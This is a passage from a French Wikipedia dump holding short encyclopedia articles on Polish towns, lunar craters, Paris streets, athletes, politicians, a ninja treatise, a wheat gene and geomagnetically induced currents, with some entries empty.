La ville, qui se trouvait à un nœud ferroviaire stratégique, a commencé à être touchée par les raids aériens en janvier 1945. À la mi-mars, l'Armée Rouge lança son offensive dans ce secteur : les abords de la ville furent âprement disputés et lorsque la Wehrmacht vit que la ville était près de tomber, le 24 mars 1945, elle fit exploser les tours de l’"Altstadt", dont celle de l'hôtel de ville. À la reddition, la ville était entièrement en ruines. La population civile avait été évacuée juste avant l'arrivée de l'Armée Rouge. Puis les forces d'occupation soviétiques placèrent toute la Silésie sous l'autorité de la République populaire de Pologne, qui rebaptisa la ville "Strzelin", les derniers habitants germanophones étant expulsés.

</doc>
<doc id="6806404" url="https://fr.wikipedia.org/wiki?curid=6806404" title="Ousmane N'Diaye">
Ousmane N'Diaye

Ousmane N'Diaye, né le à Dakar, est un footballeur sénégalais jouant au poste de défenseur au Sainte-Geneviève FC.
Palmarès.
Il est champion de Moldavie en 2019 et 2021 avec le Sheriff Tiraspol.

</doc>
<doc id="6806405" url="https://fr.wikipedia.org/wiki?curid=6806405" title="Bocar Moussa Diarra">
Bocar Moussa Diarra

Bocar Moussa Diarra, né en 1953 à Diré, est un homme politique malien, ministre de l’éducation, de l’alphabétisation, de la promotion des langues nationales et de l’instruction civique dans le gouvernement formé par Diango Cissoko le . Il est ensuite nommé ministre de la fonction publique le , dans le gouvernement de Oumar Tatam Ly.
Diplômé de l’École normale secondaire de Bamako, il a été successivement enseignant et conseiller pédagogique, a été membre du Programme de formation et d’information sur l’environnement (PFIE), un programme sous régional du Comité inter-Etats de lutte contre la sécheresse au Sahel (CILSS), et membre de l'équipe pédagogique nationale du Plan d'accompagnement de la généralisation de l'éducation environnementale au Mali (PAGEEM).
Bocar Moussa Diarra est le président de l’UM-RDA et président par intérim de l’Alliance IBK-Mali 2012. Il est chevalier de l'Ordre national du Mali.
Publications.
Coauteur de plusieurs manuels, modules et outils de formation, notamment :

</doc>
<doc id="6806407" url="https://fr.wikipedia.org/wiki?curid=6806407" title="Aipysurus mosaicus">
Aipysurus mosaicus

Aipysurus mosaicus est une espèce de serpents de la famille des Elapidae.
Répartition.
Cette espèce marine se rencontre dans les eaux de l'Australie dans le golfe de Carpentarie.

</doc>
<doc id="6806416" url="https://fr.wikipedia.org/wiki?curid=6806416" title="Liste rouge régionale des odonates du Nord-Pas-de-Calais">
Liste rouge régionale des odonates du Nord-Pas-de-Calais

Cette liste rouge régionale des libellules est issue d'un travail collaboratif entre la Société française d'odonatologie, le Groupe ornithologique et naturaliste du Nord-Pas-de-Calais et le Conservatoire faunistique régional.
Élaborée avec le soutien du comité français de l'UICN qui a donné un avis favorable à ce travail d'évaluation, elle a été validée par le Conseil scientifique régional du patrimoine naturel dans sa séance plénière du 13 décembre 2012. Ce travail est une des actions de la déclinaison régionale du plan national d'action en faveur des odonates.
Elle a pu être établie grâce aux données d'observation collectées par un réseau de personnes en très grande majorité bénévoles.
Un programme de sciences participatives du Muséum national d'histoire naturelle, dit vigie nature porte sur le "Suivi Temporel des Libellules" (STELI). Il a été testé en 2011 dans le Nord-Pas-de-Calais, puis déployé sur toute la France métropolitaine à partir de 2012.
Espèce en danger critique (CR).
Espèce confrontée à un risque très élevé de disparition
Espèces en danger (EN).
Espèces confrontées à un risque élevé de disparition
Espèce vulnérable (VU).
Espèce confrontée à un risque relativement élevé de disparition
Espèces quasi-menacées (NT).
Espèces qui pourraient devenir menacées si des mesures spécifiques de conservation n’étaient pas prises.
Espèces de préoccupation mineure (LC).
Espèces présentant un faible risque de disparition.

</doc>
<doc id="6806417" url="https://fr.wikipedia.org/wiki?curid=6806417" title="Peter Sundström">
Peter Sundström

Peter Sundström (né le à Skellefteå en Suède) est un joueur professionnel suédois de hockey sur glace devenu entraîneur. Il évolue au poste d'attaquant. Il est le frère jumeau de Patrik Sundström et l'oncle d'Alexander Sundström.
Biographie.
Carrière en club.
Il est issu d'une famille de hockeyeurs puisque son père Elon et ses oncles Kjell et Tage ont évolué dans l'élite nationale. Formé à l'IF Björklöven, il découvre l'Elitserien en 1979. Il est choisi au troisième tour en quatre-vingt-unième position par les Rangers de New York lors du repêchage d'entrée dans la LNH 1981. Il part en Amérique du Nord en 1983. Il joue dans la Ligue nationale de hockey avec les Rangers, les Capitals de Washington et les Devils du New Jersey. Il met un terme à sa carrière de joueur en 1995 après cinq saisons avec les Malmö Redhawks. Il remporte le Trophée Le Mat en 1987 avec Björklöven, puis en 1992 et 1994 avec Malmö.
Carrière en équipe nationale.
Il représente la Suède au niveau international. Il prend part aux sélections jeunes.

</doc>
<doc id="6806418" url="https://fr.wikipedia.org/wiki?curid=6806418" title="Marie Clarac">
Marie Clarac

Mère Marie-Louise Angélique Clarac, née le à Auch (France) et morte le à Moncalieri (province de Turin, Italie), est une religieuse française, fondatrice de la congrégation des Sœurs de charité de Sainte Marie et reconnue servante de Dieu par l'Église catholique depuis 1981.
Biographie.
Marie-Louise Angélique Clarac est née à Auch, en Gascogne.
Dévouée dès son plus jeune âge envers les pauvres et les nécessiteux, Marie-Louise Clarac revêt l’habit religieux à 25 ans, en 1842. Six ans plus tard, en 1848, elle part en mission en Algérie administrée par la France où elle vit durant trois années.
En 1854, elle s’installe définitivement dans la ville de Turin, en Italie, qui devient le centre de ses activités charitables. Pendant dix-sept ans, elle développe de grandes œuvres (école, oratoire, jardin d’enfants...) pour fonder enfin le , la congrégation des Sœurs de charité de Sainte Marie.
Mère Marie Clarac meurt à l’âge de 70 ans, à Moncalieri. 
Sa cause en vue de son procès en béatification est ouverte en 1981, sous le pontificat de Jean-Paul II.

</doc>
<doc id="6806419" url="https://fr.wikipedia.org/wiki?curid=6806419" title="Wiązów">
Wiązów

Wiązów est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Wiązów, dans le powiat de Strzelin.

</doc>
<doc id="6806420" url="https://fr.wikipedia.org/wiki?curid=6806420" title="Ideler (cratère)">
Ideler (cratère)

Ideler est un cratère lunaire situé sur la face visible de la Lune. Il est situé au nord du grand cratère Baco, à l'est-nord-est du cratère Breislak et à l'est-sud-est du cratère Pitiscus. Le cratère Ideler fait partie d'une paire de cratères de même dimension avec le cratère satellite "Ideler L", qui empiète sur flanc oriental du cratère Ideler. Le petit cratère satellite "Baco R" est presque attaché à l'opposé sur la bordure occidentale. Le reste de la bordure est usé, avec une paire de petits craterlets le long du contour nord et la paroi intérieure. Le plancher intérieur est presque sans relief.
En 1935, l'Union astronomique internationale lui a attribué le nom d'Ideler en l'honneur de l'astronome allemand Christian Ludwig Ideler.
Le cratère Ideler possède un certain nombre de cratères satellites identifiés avec des lettres.

</doc>
<doc id="6806422" url="https://fr.wikipedia.org/wiki?curid=6806422" title="Peter Sundstrom">
Peter Sundstrom



</doc>
<doc id="6806423" url="https://fr.wikipedia.org/wiki?curid=6806423" title="Parti démocrate (Corée)">
Parti démocrate (Corée)



</doc>
<doc id="6806424" url="https://fr.wikipedia.org/wiki?curid=6806424" title="Rue Charrière">
Rue Charrière

La rue Charrière est une voie située dans le quartier Sainte-Marguerite du de Paris, en France.
Origine du nom.
La rue tire son nom de celui d'un ancien propriétaire local.
Historique.
Ancien « passage Lacharrière », devenu « passage Charrière » puis « impasse Charrière », la voie prend le statut de rue et sa dénomination actuelle par un arrêté municipal du .

</doc>
<doc id="6806433" url="https://fr.wikipedia.org/wiki?curid=6806433" title="Pieńsk">
Pieńsk

Pieńsk est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Pieńsk, dans le powiat de Zgorzelec.
Histoire.
De 1816 à 1945, Penzig fait partie de l'arrondissement de Görlitz dans le district de Liegnitz au sein de la province de Silésie.

</doc>
<doc id="6806434" url="https://fr.wikipedia.org/wiki?curid=6806434" title="Dymocks">
Dymocks

Dymocks est une chaîne de librairies australienne. Fondée par en 1879, elle a son siège à Sydney, en Nouvelle-Galles du Sud.
L'histoire.
La première librairie Dymocks a été ouverte à Sydney par William Dymock en 1879, dans Market Street. Au fil des ans, son commerce s'est développé et il a déménagé dans des locaux plus vastes au 428 George Street, sous le nom de Dymock's Book Arcade, et il a fini par avoir un million de livres en stock. Comme il est mort sans enfant et sans s'être marié, l'entreprise est passée à sa sœur, Marjory, qui était mariée à John Forsyth. Depuis lors, la famille Forsyth gère Dymocks. En 1922, la famille Dymock a acheté le site de l'ancien Royal Hotel dans George Street et a construit le bâtiment historique Art déco de Dymocks, achevé en 1930. En 1986, la chaîne de librairies a été créée sous forme de franchise et a depuis ouvert des magasins dans tous les États d'Australie continentale, ainsi qu'à l'étranger, en Nouvelle-Zélande et à Singapour.

</doc>
<doc id="6806435" url="https://fr.wikipedia.org/wiki?curid=6806435" title="Pont sur le Grand Bras">
Pont sur le Grand Bras



</doc>
<doc id="6806436" url="https://fr.wikipedia.org/wiki?curid=6806436" title="Rue Camille-Crespin-du-Gast">
Rue Camille-Crespin-du-Gast

La rue Camille-Crespin-du-Gast est une voie située dans le quartier Saint-Ambroise du de Paris, en France.
Situation et accès.
La rue Camille-Crespin-du-Gast commence 148, rue Oberkampf et finit 21, passage de Ménilmontant.
Elle est desservie par la ligne 2 à la station "Ménilmontant".
Origine du nom.
Elle porte le nom de Camille Crespin du Gast, une pilote automobile française.
Historique.
La voie est ouverte en 1884 sous le nom de "rue Crespin", du nom de l'homme d'affaires Jacques François Crespin, propriétaire du terrain. Par arrêté du , elle prend le nom de "rue Crespin du Gast", en l'honneur de sa belle-fille, Camille Crespin du Gast, qui y avait ouvert dispensaire pour femmes enceintes et jeunes accouchées. 
À la suite de l'adoption le d'un vœu du conseil municipal du dans le cadre de la « féminisation de l'espace public de l’arrondissement », la dénomination est complétée en "rue Camille Crespin-du-Gast" par vote du Conseil de Paris le .

</doc>
<doc id="6806443" url="https://fr.wikipedia.org/wiki?curid=6806443" title="Ligne d'Asker">
Ligne d'Asker

La est une ligne de chemin de fer norvégienne à double entre Lysaker et Asker, parallèle à la ligne de Drammen. Il n'y a pas de nouvel arrêt sur cette ligne.
Histoire.
La ligne fut inaugurée le entre Sandvika et Asker. Le tronçon jusqu'à Lysaker a été mise en service le .
Tunnels.
La ligne est majoritairement souterraine à travers trois tunnels :
Soit 11.8km de tunnel sur un total de 16.83km.

</doc>
<doc id="6806444" url="https://fr.wikipedia.org/wiki?curid=6806444" title="Zawidów">
Zawidów

Zawidów (en ) est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle constitue une gmina urbaine du powiat de Zgorzelec. 
Géographie.
Zawidów est située dans la région historique de Haute-Lusace au pied nord des monts de la Jizera, une chaîne des Sudètes. Le centre ville se trouve à 16 km au sud de Zgorzelec, la ville frontière avec l'Allemagne. La frontière entre la Pologne et la République tchèque et la commune de Habartice se situent immédiate au sud.
Histoire.
Au début du , la région autour du "mont Syden" s'étendant entre la Neisse et la Kwisa appartint à la marche de Misnie sous le règne de la maison de Wettin. Elle était située au sein du pays de Bautzen (Budissin), la future Haute-Lusace, qui après le décès du margrave Conrad en 1157 a été attribué aux souverains de ducs de Bohême. 
La ville de Seidenberg a été probablement fondée par le roi Ottokar II Přemysl. Après sa mort en 1278, elle appartenait à la seigneurie de Friedland. Le privilège urbain selon le droit de Magdebourg a été confirmé en 1396. La ville fut devastée pendant les croisades contre les hussites en 1427 et encore une fois en 1433 ; en 1469, les troupes du roi Georges de Poděbrady ont brûlé toutes les maisons.
En 1551, le domaine a été acquis par la noble famille de Redern. Confisquée par l'empereur Ferdinand II après la bataille de la Montagne-Blanche en 1620, la seigneurie de Friedland fut engagée à Albrecht von Wallenstein, tandis que la Haute-Lusace au nord avec Seidenberg passa à l'électeur Jena-Georges de Saxe. La seigneurie a été vendue à la noble famille de Nostitz en 1626.
En 1815, après les guerres napoléoniennes, le Congrès de Vienne décida de donner la partie nord et est de la Haute-Lusace au royaume de Prusse, et la ville de Seidenberg fit ainsi partie de l'arrondissement de Lauban dans le district de Liegnitz au sein de la province prussienne de Silésie (Basse-Silésie) jusqu'à la fin de la Seconde Guerre mondiale. Au cours du déplacement de la frontière entre l'Allemagne et la Pologne sur l’Oder et la Neisse en 1945, la partie est de la Haute-Lusace et la ville de Zawidów furent cédées à la Pologne.

</doc>
<doc id="6806445" url="https://fr.wikipedia.org/wiki?curid=6806445" title="Pitiscus (cratère)">
Pitiscus (cratère)

Pitiscus est un cratère lunaire situé sur la face visible de la Lune. Il est situé au nord des cratères Ideler et Breislak. Le cratère Pitiscus a un terrain recouvert par de la lave. Il y a un petit pic central. Le contour nord du cratère est coupé par le cratère satellite « Pitiscus A ». Plusieurs craterlets sont visibles le long de la paroi intérieure orientale du cratère.
En 1935, l'Union astronomique internationale lui a attribué le nom de Pitiscus en l'honneur de l'astronome allemand Bartholemaeus Pitiscus. 
Le cratère Pitiscus possède un certain nombre de cratères satellites identifiés avec des lettres.

</doc>
<doc id="6806446" url="https://fr.wikipedia.org/wiki?curid=6806446" title="TaGW2">
TaGW2

Le gène TaGW2 est un gène homologue au gène "GW2" qui existe chez le maïs. 
Chez le maïs, les chercheurs ont découvert que le gène "GW2" permettait de diminuer la taille des grains. Comme les deux gènes sont homologues, l’équipe de recherche ont voulu savoir si le gène "TaGW2" avait la même fonction. Les études pour déterminer le rôle de cette protéine ont été faites chez le blé, qui est un organisme héxaploide (2n = 6x = 42 chromosomes). 
Localisation de la protéine.
La protéine TaGW2 est localisée dans le cytosol, le nucléoplasme et le nucléole. 
Rôle de la protéine TaGW2.
Les chercheurs ont trouvé que la protéine TaGW2 était une protéine ligase de type E3, impliquée dans le mécanisme de l’ubiquitination. Ce mécanisme est un mécanisme clé de régulation de la signalisation. Il s’agit d’un système de dégradation des protéines par le protéasome grâce aux protéines Ub, E1, 2 et 3. 
Effets de la protéine sur le grain de blé.
"TaGW2" n’a pas d’action sur : 
Contrairement à "GW2" on observe une diminution du nombre de grains par épi de 29,9 % et une augmentation du nombre de panicules de 27 % environ.
Le gène"TaGW2" constituerait un outil pour l’amélioration du rendement des grains.

</doc>
<doc id="6806450" url="https://fr.wikipedia.org/wiki?curid=6806450" title="Le Désordre">
Le Désordre

Le Désordre (") est un film franco-italien de Franco Brusati, sorti en 1962.
Synopsis.
Mario, jeune barman milanais aux ambitions professionnelles contrariées, est plus ou moins impliqué dans une succession d'histoires se déroulant dans l'Italie des années 1960. À la recherche d'une solution pour subvenir aux besoins de sa mère malade et nécessiteuse, il est confronté à l'égoïsme et aux débordements des mœurs d'une société décadente.Isabella, une jeune bourgeoise, se met dans tous ses états après avoir été repoussée par son père mourant, un industriel fortuné avec lequel elle tentait de se réconcilier. Bruno, un ami d'enfance de Mario, devenu riche et cynique, rencontré au hasard d'une soirée, se moque de sa détresse. Andrea et Mali, jeunes mariés dont le couple bat de l'aile, acceptent de passer la nuit chez leur hôte Tom esseulé, car il vient d'être abandonné par sa maîtresse. Mais Mali passe la nuit avec Tom, ce qui provoque la dislocation du couple. Avant de quitter la demeure de son hôte, Andrea assiste au retour de la « maîtresse » de Tom : c'est Bruno qui vient retrouver son amant. Mario rend visite à sa mère à l'hospice et sollicite l'aide du prêtre Don Giuseppe. Ce dernier l'invite à son domicile pour étudier son cas. Mario y découvre une faune interlope vivant aux dépens de Don Giuseppe qui s'avère être un prêtre défroqué. Mario l'accuse d'être un imposteur. Peu après, la mère de Mario reçoit un don anonyme, une importante somme d'argent qui la met à l'abri du besoin, et Mario découvre que Don Giuseppe a vendu sa maison.

</doc>
<doc id="6806456" url="https://fr.wikipedia.org/wiki?curid=6806456" title="Mohamed Lemine Ould Aboye Ould Cheikh El Hadrami">
Mohamed Lemine Ould Aboye Ould Cheikh El Hadrami

Mohamed Lemine Ould Aboye Ould Cheikh El Hadrami est né le à Amourj en Mauritanie, est le Ministre de l'hydraulique et de l'assainissement de Mauritanie du au 22 mars 2011, puis Ambassadeur de la Mauritanie au Senegal de jusqu'en , puis a été nommé Ambassadeur de Mauritanie au Niger fonction qu'il occupa jusqu'en 2017. 
Il est titulaire d'un doctorat en hydrogéochimie et environnement de l'ENS de Rabat (Maroc).
Biographie.
Mohamed Lemine Ould Aboye Ould Cheikh El Hadrami a commencé sa carrière en 1993 comme Professeur à la Faculté des Sciences et Techniques de l'Université de Nouakchott et professeur assistant à l'ENS de Rabat. 
En 1995, il occupe le poste de Coordinateur du projet changements climatiques à la Direction de l'environnement et de l'aménagement rural. 
En 1998, il devient cadre au Ministère du Développement rural et de l'environnement. 
À partir de 2004, il occupe le poste de Conseiller technique du Ministre du Développement rural et de l'environnement, chargé de l'environnement, avant d'être nommé en 2006 secrétaire d'État auprès du Premier ministre, chargé de l'environnement. 

</doc>
<doc id="6806465" url="https://fr.wikipedia.org/wiki?curid=6806465" title="Ultimate Requiem">
Ultimate Requiem



</doc>
<doc id="6806466" url="https://fr.wikipedia.org/wiki?curid=6806466" title="Liste de films tournés à la Guadeloupe">
Liste de films tournés à la Guadeloupe



</doc>
<doc id="6806468" url="https://fr.wikipedia.org/wiki?curid=6806468" title="Ernest Leroux">
Ernest Leroux

Louis Ernest Leroux, né à Saint-Quentin le et mort à Paris le , est un libraire et éditeur français.
Biographie.
Louis-"Ernest" Leroux est le fils d'un charcutier saint-quentinois. En 1871, il fonde à Paris, au 28 rue Bonaparte, la « Librairie Ernest Leroux » dans laquelle il se présente comme un expert en livres anciens venus d’Extrême-Orient et notamment d'estampes japonaises.
Peu à peu, il commence à éditer sous la marque « Ernest Leroux, Éditeur » des ouvrages traitant principalement d'orientalisme et d'archéologie, développant tout un fonds d'érudition que l'essor du colonialisme allait favoriser. La philosophie, l'histoire des religions, et bientôt, l'ethnologie et l'anthropologie sont des domaines que Leroux accueille dans sa maison.
Côté périodique, il prend en charge en 1876 "La Revue critique d’histoire et de littérature" fondée dix ans plus tôt par Paul Meyer et Gaston Paris. En 1900, il devient le principal éditeur de revues savantes, en comptant plus de 25 à son catalogue dont la "Revue de l'histoire des religions".
En raison des services ainsi rendus à la recherche et à l'érudition, Leroux est décoré de la Légion d'honneur en 1888.
Dans les années 1920, le fonds passe progressivement sous la gérance des Presses universitaires de France : le sinologue Paul Pelliot et Louis Eisenmann sont responsables des éditions Leroux au conseil d’administration des Presses, lesquelles finissent par entériner la fusion en 1939.
Ernest Leroux est le père de Léontine-"Jacqueline" Leroux (née en 1872), épouse de l'architecte Charles Heubès.

</doc>
<doc id="6806476" url="https://fr.wikipedia.org/wiki?curid=6806476" title="Les Funérailles de la Grande Mémé">
Les Funérailles de la Grande Mémé

Les Funérailles de la Grande Mémé est un recueil de nouvelles de l'écrivain colombien Gabriel García Márquez publié en 1962.
Il s'agit d'un recueil de huit nouvelles (contes selon la dénomination de Márquez) représentatives du réalisme magique.
Dans ces courts récits, Gabriel García Márquez expose ses préoccupations sur les thèmes de la mémoire, du temps, de la mort et de la solitude.

</doc>
<doc id="6806478" url="https://fr.wikipedia.org/wiki?curid=6806478" title="Miss You / Hohoemi no Saku Basho">
Miss You / Hohoemi no Saku Basho

Miss You / Hohoemi no Saku Basho est le 35single du groupe AAA sorti sous le label Avex Trax le au Japon. Il arrive à l'Oricon. Il se vend à exemplaires la première semaine et reste classé 3 semaines pour un total de exemplaires vendus en tout durant cette période. Il sort en format CD, CD+DVD, et CD mu-mo.
"Miss You" et "Hohoemi no Saku Basho" se trouvent sur l'album "Eight Wonder".

</doc>
<doc id="6806480" url="https://fr.wikipedia.org/wiki?curid=6806480" title="Craig Cannonier">
Craig Cannonier

Craig Cannonier, né en 1963, est un homme politique bermudien. Il est Premier ministre des Bermudes du au .
Biographie.
Craig Cannonier naît aux Bermudes en 1963. Il suit des études de psychologue du travail à l'université de Towson, d'où il sort diplômé en 1986. Il revient ensuite aux Bermudes pour être directeur des ressources humaines dans diverses entreprises bermudiennes.
Dirigeant, depuis 2011, de la formation politique One Bermuda Alliance qui remporte les élections législatives du, il devient Premier ministre des Bermudes le lendemain en succédant à Paula Cox. Le , il démissionne et est remplacé par Michael Dunkley.

</doc>
<doc id="6806483" url="https://fr.wikipedia.org/wiki?curid=6806483" title="Valdin Legister">
Valdin Legister

Valdin Legister, né en 1979, est un arbitre jamaïcain de football international depuis 2010.
Carrière.
Il a officié dans des compétitions majeures :

</doc>
<doc id="6806487" url="https://fr.wikipedia.org/wiki?curid=6806487" title="Basil Stewart">
Basil Stewart

Basil Stewart est un homme politique canadien qui est maire de Summerside depuis 1985. Il est aussi le président de la Fédération canadienne des municipalités.
Avant la mairie.
Avant son élection comme maire, Stewart était un policier pour le département de police de Summerside de 1971 à 1984.
Mairie.
Après sa retraite de la police, Stewart est entré dans la politique municipale, il fut élu comme maire du village de Summerside en 1985. Il fut réélu en 1988 et 1991. En 1994, il fut le premier maire de la ville de Summerside. Il fut réélu aux élections municipales de 1997, 2000, 2003, 2006 et 2010.
À l'Élection fédérale canadienne de 1993, Stewart s'est présenté comme le candidat conservateur pour le district d'Egmont. Il fut défait par le député libéral en fonction Joe McGuire, qui a gagné avec environ 3,700 votes de plus.
Il est accusé de gaspiller 1.3 million dollars des contribuables, l'argent fut dirigé à un concert tribut pour Micheal Jackson qui ne s'est pas matérialisé.
Objectifs et buts.
Stewart a plusieurs buts et objectifs pour améliorer Summerside comme endroit pour travailler, vivre et fondé une famille. Stewart fut instrumental pour apporter des gros tournois et évènements, comme le championnat canadien du baseball PeeWee, le championnat canadien de balle molle féminin et une partie pré-saison de la LNH. Il fut une force majeure pour la construction du Consolidated Credit Union Place.
Comités.
Stewart n'est pas seulement le maire de Summerside, il est aussi sur plusieurs comités. Il est présentement le président de la Fédération canadienne des municipalités et un membre de la fédération des municipalités de l'Île-du-Prince-Édouard et sur le conseil national des directeurs des municipalités viables en infrastructure (National Board of Directors to Sustainable Municipal Infrastructure). Dans le passé, il fut président du conseil atlantique en 1998 et président du Comité national pour un développement économique (National Economic Development Committee) de 1998 à 2000.
Poursuite judiciaire : le maire et le conseil de Summerside contre David Griffin.
Le maire Stewart et le conseil de la ville de Summerside a intenté une poursuite contre le député chef de police David Griffin en 1997. Le cas est toujours dans les cours en octobre 2010, avec appel du paiement des intérêts des dommages dus à Griffin basé sur un jugement de mars 2006 par le juge de la cour suprême Wayne Cheverie qui a statué en faveur de Griffin.
Famille et intérêts.
Stewart vit à Summerside avec son épouse Gail Inman-Stewart. Il a deux enfants : Mary-Jane (Steve Dyer) et Major (Holly Peters). Stewart a quatre petites-filles — Mya Stewart et Amber, Emma et Madison Dyer. Il a trois petits-fils - Brett et Isaac Stewart et Lincoln Dyer.
Ses passe-temps incluent le hockey, la natation et la musique (il joue la guitare, l'harmonica, le fiddle et la mandoline.).

</doc>
<doc id="6806492" url="https://fr.wikipedia.org/wiki?curid=6806492" title="Bansenshūkai">
Bansenshūkai

Le Bansenshukai (萬川集海, littéralement « Dix mille rivières se rassemblent dans la mer » ) est un ensemble de savoirs ninja attribué à un maître ninja de la province d'Iga, nommé Fujibayashi Sabuji, Fujibayashi Yasutake, ou Fujibayashi Yasuyoshi. Composé en 1676, il témoigne des traditions de l'époque (d'influences chinoises) relatives à la philosophie, à la stratégie et à l'astrologie, mais aussi des techniques telles que la fabrication des outils ou la préparation d'explosifs artisanaux.
Avec le "Shōninki" et le "Ninpiden", il est l'un des trois principaux écrits Ninja qui nous soient parvenus.
Il a été édité pour la toute première fois hors du Japon en mai 2013, en langue française, grâce aux travaux d'Axel Mazuer.
Contenu.
Le Bansenshukai est principalement constitué de vingt-deux volumes rassemblés au sein de dix cahiers :
Au Yang répond le Yin ("In" en japonais), qui lui est opposé mais complémentaire. Aussi les trois cahiers suivants du Bansenshûkai sont-ils consacrés aux « aspects yin du ninjutsu » ou "in-nin". Au contraire du Yang, ce sont toutes les techniques et stratégies qualifiées de Yin, à la fois parce qu’elles sont agressives, intrusives, offensives, et parce que le ninja agit dans l’ombre, « dans la nuit ».
Versions.
Il existe deux versions :
Copies.
Après la Seconde Guerre mondiale, un nombre limité de copies manuscrites est proposé au public. Quelques-unes de ces copies sont dans certaines bibliothèques nationales et universitaires majeures

</doc>
<doc id="6806493" url="https://fr.wikipedia.org/wiki?curid=6806493" title="Eustache Asseline">
Eustache Asseline

Eustache Asseline, dit Dom Eustache de Saint-Paul, en latin Eustachius a Sancto Paulo, est un religieux français, moine cistercien de la congrégation des Feuillants, né à Paris en 1575, mort également à Paris en 1640.
Carrière.
Son père, Eustache Asseline, seigneur de Champeaux, était avocat au Parlement de Paris. Sa mère, Marie le Grand, était, entre autres, cousine de Claude Mangot (garde des sceaux en 1616). Il fit de brillantes études à la Sorbonne en même temps que Pierre de Bérulle ("hospes" de l'université en 1600, prieur en 1603, docteur en 1604). L'année même de son doctorat, sa profonde admiration pour Bernard de Clairvaux et sa dévotion pour la Vierge Marie le conduisirent au couvent des Feuillants, et il prononça ses vœux en 1606.
Dans le domaine intellectuel, attaché à la faculté de théologie de Paris, il publia notamment en 1609 une "Summa philosophiæ quadripartita" qui fut un des principaux manuels de philosophie du , réimprimée une vingtaine de fois jusqu'en 1649. Ce fut à l'époque l'exposition la plus claire et complète de la philosophie scolastique, admirée par Descartes qui envisagea de s'en servir comme base pour une réfutation de cette philosophie.
Il exerça d'importantes responsabilités dans sa congrégation (visiteur général en 1620), et joua un grand rôle auprès du cardinal de La Rochefoucauld, nommé en 1622 « commissaire apostolique » chargé de réformer les ordres religieux anciens du royaume. Aux côtés notamment du jésuite Étienne Binet, du bénédictin Colomban Régnier, du dominicain Georges Laugier et du minime Pierre Guérin, il prit une part active aux conférences convoquées par le cardinal, et participa notamment au rétablissement de l'observance régulière chez les Augustins, les Bénédictins, les Clunisiens et les Cisterciens. Il fut aussi connu dans la capitale pour son action auprès des moniales, proche à la fois de Barbe Acarie et des carmélites de Pontoise, et des sœurs de Port-Royal après la « Journée du Guichet » (1609). Il fut introduit dans cette dernière communauté par son ami le capucin Archange de Pembroke et en devint directeur spirituel et confesseur. Il était un proche de la famille Arnauld (notamment des parents Antoine Arnauld et Catherine Marion, et de l'aîné des enfants Robert Arnauld d'Andilly). Il soutint l'abbesse Angélique Arnauld dans son entreprise de réforme de l'abbaye de Maubuisson (1618/23).
Jusqu'à sa mort en 1640, Eustache de Saint-Paul exerça un ascendant spirituel important en France du fait de la renommée de ses écrits et de l'influence considérable dont il jouissait auprès de très nombreuses communautés religieuses. Son biographe et disciple Antoine Lejeune affirme que les Célestins, les Cordeliers, les Carmes, les religieuses de Fontevrault, de Chelles, de Malnoue, du Val-de-Grâce de Bièvres et de Pontoise faisaient très souvent appel à ses services. Devant le foisonnement de cette activité, il en oublie d'ailleurs de citer les Ursulines : Eustache de Saint-Paul fut leur supérieur à Paris, et révisa le coutumier de celles de Tours. Avec son ancien condisciple Pierre de Bérulle, et son ami François de Sales, il fut l'un des hommes-clefs du renouveau de la vie religieuse en France à cette époque.

</doc>
<doc id="6806496" url="https://fr.wikipedia.org/wiki?curid=6806496" title="X-Tower Osaka Bay">
X-Tower Osaka Bay

X-Tower Osaka Bay ou Cross Tower Osaka Bay (クロスタワー大阪ベイ) est un gratte-ciel qui se situe près de la gare de Bentenchō, dans l'arrondissement de Minato à Osaka. Il mesure 200 mètres de hauteur et compte 456 appartements.

</doc>
<doc id="6806497" url="https://fr.wikipedia.org/wiki?curid=6806497" title="Diurodrilida">
Diurodrilida



</doc>
<doc id="6806508" url="https://fr.wikipedia.org/wiki?curid=6806508" title="Liste de films tournés à la Martinique">
Liste de films tournés à la Martinique



</doc>
<doc id="6806511" url="https://fr.wikipedia.org/wiki?curid=6806511" title="Indooroopilly">
Indooroopilly

Indooroopilly est une localité du Queensland, en Australie. C'est un quartier de Brisbane, située en banlieue à sept kilomètres à l'ouest du centre d'affaires de Brisbane.

</doc>
<doc id="6806517" url="https://fr.wikipedia.org/wiki?curid=6806517" title="Mbugu">
Mbugu

Mbugu peut désigner :

</doc>
<doc id="6806521" url="https://fr.wikipedia.org/wiki?curid=6806521" title="Debalo">
Debalo

 
Debalo est une localité du Soudan du Sud située dans l'État fédéré du Nil Supérieur sur la rive occidentale du Nil Blanc, entre Malakal au sud et Kodok au nord. Le village est peuplé par des membres de l'ethnie Shilluk.

</doc>
<doc id="6806528" url="https://fr.wikipedia.org/wiki?curid=6806528" title="Carretera austral">
Carretera austral



</doc>
<doc id="6806530" url="https://fr.wikipedia.org/wiki?curid=6806530" title="First Hawaiian Center">
First Hawaiian Center

Le First Hawaiian Center est, depuis 1996, le plus haut gratte-ciel de Honolulu, à Hawaï. Son architecte est le cabinet Kohn Pedersen Fox. Sa construction, qui s’est déroulée de 1993 à 1996, a coûté de dollars. Le First Hawaiian Center abrite le siège de la First Hawaiian Bank.
Comptant , l’édifice a une hauteur de .

</doc>
<doc id="6806532" url="https://fr.wikipedia.org/wiki?curid=6806532" title="Armées">
Armées



</doc>
<doc id="6806534" url="https://fr.wikipedia.org/wiki?curid=6806534" title="Courant induit géomagnétiquement">
Courant induit géomagnétiquement

Un courant induit géomagnétiquement ou CIG (en anglais, "" ou "GIC") est un courant engendré par la météorologie de l'espace qui affecte les conducteurs électriques de grandes longueurs. Le champ magnétique terrestre est influencé par les variations du courant électrique présent dans la magnétosphère ou l'ionosphère.
Lors de grandes variations de ces derniers, un courant électrique est induit dans les conducteurs électriques présents sur terre. Le phénomène n'est perceptible que sur les longs conducteurs comme les lignes à haute tension ou les pipelines.
Ces phénomènes sont particulièrement intenses dans les hautes latitudes, près des pôles.
Les GIC sont la source de divers problèmes : ils provoquent de la corrosion sur les pipelines, endommagent les transformateurs haute tension, perturbent les télécommunications et les réseaux ferroviaires. Ils sont une des nombreuses conséquences possibles des orages magnétiques.
Contexte.
